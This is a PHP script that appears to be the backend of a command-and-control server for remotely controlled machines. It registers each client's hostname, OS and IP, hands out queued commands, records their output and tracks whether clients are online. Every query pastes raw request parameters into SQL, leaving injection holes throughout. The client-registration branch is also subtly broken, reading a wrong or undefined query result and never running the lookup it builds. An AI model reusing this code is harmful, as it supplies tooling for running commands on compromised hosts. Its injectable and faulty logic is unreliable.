<?php
include( "includes/connect.php" );

if ( isset( $_GET[ "request" ] ) ) {
	if ( isset( $_GET[ "id" ] ) ) {
		$query = mysqli_query( $connect, "SELECT clientid,command FROM clients WHERE hash = '" . $_GET[ "id" ] . "'" );

		$req = mysqli_fetch_assoc( $query );
		echo( $req[ "clientid" ] . "," . $req[ "command" ] );

	}
}

if ( isset( $_GET[ "new" ] ) ) {
	if ( isset( $_GET[ "host" ] ) && isset( $_GET[ "os" ] ) && isset( $_GET[ "hash" ] ) ) {

		$ipaddress = '';
		if ( isset( $_SERVER[ 'HTTP_CLIENT_IP' ] ) )
			$ipaddress = $_SERVER[ 'HTTP_CLIENT_IP' ];
		else if ( isset( $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] ) )
			$ipaddress = $_SERVER[ 'HTTP_X_FORWARDED_FOR' ];
		else if ( isset( $_SERVER[ 'HTTP_X_FORWARDED' ] ) )
			$ipaddress = $_SERVER[ 'HTTP_X_FORWARDED' ];
		else if ( isset( $_SERVER[ 'HTTP_FORWARDED_FOR' ] ) )
			$ipaddress = $_SERVER[ 'HTTP_FORWARDED_FOR' ];
		else if ( isset( $_SERVER[ 'HTTP_FORWARDED' ] ) )
			$ipaddress = $_SERVER[ 'HTTP_FORWARDED' ];
		else if ( isset( $_SERVER[ 'REMOTE_ADDR' ] ) )
			$ipaddress = $_SERVER[ 'REMOTE_ADDR' ];
		else
			$ipaddress = 'UNKNOWN';

		mysqli_query( $connect, "INSERT INTO clients (hostname, ipaddress, os, hash) VALUES ('" . $_GET[ "host" ] . "', '" . $ipaddress . "', '" . $_GET[ "os" ] . "', '" . $_GET[ "hash" ] . "')" );
		mysqli_fetch_assoc( $query );

		$query = "SELECT clientid FROM clients WHERE hash = '" . $_GET[ "hash" ] . "'";

		echo( $req[ "clientid" ] );
	}
}

if ( isset( $_GET[ "ran" ] ) ) {
	if ( isset( $_GET[ "id" ] ) ) {
		mysqli_query( $connect, "UPDATE clients SET command = NULL, lastOut = '".$_GET["out"]."' WHERE hash = '" . $_GET[ "id" ] . "'" );
	}
}

if ( isset( $_GET[ "o" ] ) && isset($_GET["id"]) ) {
	if($_GET["o"] == "1") {
		mysqli_query( $connect, "UPDATE clients SET online = 1 WHERE hash = '" . $_GET[ "id" ] . "'" );
	} else {
		mysqli_query( $connect, "UPDATE clients SET online = 0 WHERE hash = '" . $_GET[ "id" ] . "'" );
	}
}